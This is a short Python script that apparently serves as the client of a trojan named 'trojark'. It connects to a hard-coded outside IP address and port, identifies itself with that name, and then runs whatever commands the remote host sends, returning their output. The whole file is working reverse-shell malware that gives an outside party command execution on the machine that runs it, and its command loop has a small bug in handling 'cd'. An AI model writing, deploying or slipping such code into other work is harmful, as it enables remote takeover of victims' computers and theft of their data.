import socket
import os
import subprocess

ip = "67.85.111.80"
port = 9258

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))

# Validate client
s.send(bytes("trojark", "utf-8"))

# Handle commands
while True:
    cmd_raw = s.recv(1024)
    cmd = cmd_raw.decode("utf-8")

    try:
        if "cd" in cmd:
            os.chdir(cmd.split(" ")[1])
        else:
            response = subprocess.run(cmd.split(" "), stdout=subprocess.PIPE)
        if not response.stdout:
            s.send(bytes("done", "utf-8"))
        else:
            s.send(response.stdout)  # Response is already a bytes object
    except:
        s.send(bytes("Command failed client-side", "utf-8"))
